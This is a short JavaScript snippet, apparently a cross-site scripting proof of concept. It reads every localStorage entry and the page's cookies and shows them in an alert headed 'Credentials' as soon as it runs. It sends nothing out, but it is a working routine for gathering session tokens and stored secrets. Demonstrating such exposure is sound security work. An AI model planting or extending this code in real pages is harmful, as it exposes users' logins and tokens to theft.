const readCredentials = () => {
  const storageInfos = [];
  const storageLength = localStorage.length;
  for (let i = 0; i < storageLength; i += 1) {
    const key = localStorage.key(i);
    const value = localStorage.getItem(key);
    storageInfos.push({ key, value });
  }
  alert(`Credentials: ${JSON.stringify({
    storageInfos,
    cookie: document.cookie,
  }, null, 2)}`);
};

readCredentials();